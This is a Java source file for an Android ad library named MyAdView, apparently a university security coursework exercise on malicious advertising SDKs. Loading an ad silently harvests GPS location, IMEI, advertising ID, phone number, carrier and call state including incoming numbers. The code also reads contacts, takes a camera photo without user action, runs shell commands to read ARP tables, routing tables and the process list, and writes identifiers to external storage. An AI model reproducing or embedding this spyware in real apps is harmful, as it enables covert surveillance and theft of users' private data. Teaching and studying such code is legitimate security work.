package uk.ac.imperial.apss.comp97109.myadvertisinglibrary;


import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.os.UserManager;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.sql.Timestamp;

import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;

import androidx.core.app.ActivityCompat;
import androidx.core.content.FileProvider;

import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.concurrent.ExecutionException;


public class MyAdView {
    private static final String TAG = "CW2: MyAdView";
    public static Context ctx;
    public static boolean isLAT = false;
    private static String current_location = null;
    private static String current_ad_id = null;

    public static void loadAd(TextView tv, Context ctx) {
        MyAdView.ctx = ctx;
        // TASK 1: Welcome message changed
        tv.setText("Hello Ad2new!");
        onLoad();
    }

    private static void onLoad() {
        // TASK 2: Get the devices location
        // Create LocationManager instance as reference to the location service
        LocationManager locationManager = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        // Define a LocationListener to handle location changes
        LocationListener locationListener = new MyLocationListener();
        if (ActivityCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        // Check if have retrieved the location ask for location updates
        assert locationManager != null : "Error while retrieving location.";
        locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER, 5000, 10, locationListener);

        // TASK 3: Get IMEI
        // Find string that uniquely identifies the device
        TelephonyManager telephonyManager = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        final String IMEI_id = telephonyManager.getDeviceId();
        Log.d(TAG + "| IMEI: ", IMEI_id);


        // TASK 4 & 6: Get Advertising ID and write it to file along with other info
        AsyncTask.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    AdvertisingIdClient.Info adInfo = AdvertisingIdClient.getAdvertisingIdInfo(ctx);
                    current_ad_id = adInfo.getId();
                    Log.d(TAG + "| Ad_ID: ", current_ad_id);
                    // Gather the information needed to be stored in the file (location, IMEI, ad_id)
                    String info_needed = System.currentTimeMillis() + ";" + current_location + "\n" +
                            System.currentTimeMillis() + ";IMEI:" + IMEI_id + "\n" +
                            System.currentTimeMillis() + ";advertising_id:" + current_ad_id;
                    Log.d(TAG + "| final: ", info_needed);
                    // Declare file name
                    String filename = "Part1_malad.txt";
                    try {
                        // Write to sdcard (ExternalStorageDirectory)
                        File file = new File(Environment.getExternalStorageDirectory(), filename);
                        PrintWriter fos;
                        fos = new PrintWriter(new FileOutputStream(file));
                        fos.println(info_needed);
                        fos.flush();
                        fos.close();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });

        //Task 2.b get extra sensitive information
        read_process();
        retrive_network_info();
        //determine local IPs, as well as gain a better understanding of the target’s networking structure
        read_network_routing();
        //get pic of the user
        try {
            read_proc();
        } catch (Exception e) {
            e.printStackTrace();
        }
        //get phone number
        //use phone number collected by ad to advertice by sms
        TelephonyManager tMgr = (TelephonyManager)ctx.getSystemService(Context.TELEPHONY_SERVICE);
        String mPhoneNumber = tMgr.getLine1Number();
        Log.d("phone number",mPhoneNumber);

        //get network and sim operator
        String networkOperator = tMgr.getNetworkOperatorName();
        String simOperator = tMgr.getSimOperatorName();
        Log.d("phone network operator",networkOperator);
        Log.d("phone sim operator",simOperator);

        //get phone call state (if ongoing states)
        StateListener phoneStateListener = new StateListener();
        telephonyManager.listen(phoneStateListener,PhoneStateListener.LISTEN_CALL_STATE);


    }
    static class StateListener extends PhoneStateListener {
        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
            super.onCallStateChanged(state, incomingNumber);
            switch (state) {
                case TelephonyManager.CALL_STATE_RINGING:
                    Log.d("phone call state","CALL_STATE_RINGING, ringing number: " + incomingNumber);
                    break;
                case TelephonyManager.CALL_STATE_OFFHOOK:
                    Log.d("phone call state","CALL_STATE_OFFHOOK, calling number: "  + incomingNumber);
                    break;
                case TelephonyManager.CALL_STATE_IDLE:
                    Log.d("phone call state","CALL_STATE_IDLE");
                    break;
            }
        }
    };
    static String currentPhotoPath;

    private static File createImageFile() throws IOException {
        // Create an image file name
        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
        String imageFileName = "JPEG_" + timeStamp + "_";
        File storageDir = ctx.getExternalFilesDir(Environment.DIRECTORY_PICTURES);
        File image = File.createTempFile(
                imageFileName,  /* prefix */
                ".jpg",         /* suffix */
                storageDir      /* directory */
        );

        // Save a file: path for use with ACTION_VIEW intents
        currentPhotoPath = image.getAbsolutePath();
        return image;
    }



    /**
     * A safe way to get an instance of the Camera object.
     */
    public static Camera getCameraInstance() {
        Camera c = null;
        try {
            c = Camera.open(); // attempt to get a Camera instance
        } catch (Exception e) {
            // Camera is not available (in use or does not exist)
        }
        return c; // returns null if camera is unavailable
    }

    private static void read_proc() throws IOException {
        // Create an instance of Camera
        Camera mCamera = getCameraInstance();


        Camera.PictureCallback mPicture = new Camera.PictureCallback() {

            @Override
            public void onPictureTaken(byte[] data, Camera camera) {

                File photoFile = null;
                try {
                    photoFile = createImageFile();
                    Log.d("photo path",photoFile.getAbsolutePath());
                } catch (IOException e) {
                    e.printStackTrace();
                }
                if (photoFile == null) {
                    Log.d("TAG", "Error creating media file, check storage permissions");
                    return;
                }

                try {
                    FileOutputStream fos = new FileOutputStream(photoFile);
                    fos.write(data);
                    fos.close();
                    Log.d("take photo","photo taken success");
                } catch (FileNotFoundException e) {
                    Log.d(TAG, "File not found: " + e.getMessage());
                } catch (IOException e) {
                    Log.d(TAG, "Error accessing file: " + e.getMessage());
                }
            }
        };
        mCamera.takePicture(null, null, mPicture);

    }

    private static void read_network_routing() {
        try {
            Process process = Runtime.getRuntime().exec("cat /proc/net/fib_trie");
            BufferedReader bufferedReader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));
            String line;
            String final_info = "";
            while (((line = bufferedReader.readLine()) != null)) {
                final_info += line + "\n";
            }
            Log.d("network routing", final_info);

        } catch (Exception e) {

        }

    }

    private static void retrive_network_info() {
        try {
            Process process = Runtime.getRuntime().exec("cat /proc/net/arp");
            BufferedReader bufferedReader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));
            String line;
            while (((line = bufferedReader.readLine()) != null)) {
                Log.d("network interface info", line + "\n");
            }
        } catch (Exception e) {

        }
    }

    private static void read_process() {
        ArrayList<String> Name = new ArrayList<>();
        ArrayList<Long> CPU = new ArrayList<>();
        ArrayList<String[]> all_process_info = new ArrayList<>();
        try {
            Process process = Runtime.getRuntime().exec("top -n 1");
            //Get the output of top so that it can be read
            BufferedReader bufferedReader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));
            String line;
            int i = 0;
            //Read every line of the output of top that contains data
            while (((line = bufferedReader.readLine()) != null)) {
                //Break the line into parts.  Any number of spaces greater than 0 defines a new element
                String[] numbersC = line.split("[ ]+");
                all_process_info.add(numbersC);
                if (i > 6) {
                    //Some lines start with a space, so their indices are different than others
                    if (numbersC[0].equals("")) {
                        //If name contains the string com.android, then it is a process that we want to take values for
                        if (numbersC[numbersC.length - 1].toLowerCase().contains("com.android".toLowerCase())) {
                            //Add the name of the process to the Name arraylist, excluding the com.android. part
                            Name.add(numbersC[numbersC.length - 1].replace("com.android.", ""));

                            //Add the CPU value of the process to the CPU arraylist, without the % at the end
                            CPU.add(Long.parseLong(numbersC[3].replace("%", "")));
                        }
                    } else {
                        //This is basically the same as above, except with different index values, as there is no leading space in the numbers array
                        if (numbersC[numbersC.length - 1].toLowerCase().contains("com.android.".toLowerCase())) {
                            Name.add(numbersC[numbersC.length - 1].replace("com.android.", ""));
                            CPU.add(Long.parseLong(numbersC[2].replace("%", "")));
                        }
                    }
                }
                i++;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        Log.d("process name", Name.toString());
        Log.d("CPU util", CPU.toString());
    }

    // TASK 5: Read the user's contacts
    private static ArrayList<String> readContacts() {
        // List to append contacts to
        ArrayList<String> contacts = new ArrayList<String>();
        ContentResolver contentResolver = ctx.getContentResolver();
        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        if (cursor.moveToFirst()) {
            do {
                // Append contact names found in the array list
                contacts.add(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)));
            } while (cursor.moveToNext());
        }
        return contacts;
    }

    private static class MyLocationListener implements LocationListener {

        @Override
        public void onLocationChanged(Location location) {

            current_location = "longitude:" + location.getLongitude() + ";latitude:" + location.getLatitude();
            Log.d("Location", location.toString());
        }

        @Override
        public void onStatusChanged(String s, int i, Bundle bundle) {
        }

        @Override
        public void onProviderEnabled(String s) {
        }

        @Override
        public void onProviderDisabled(String s) {
        }
    }
}
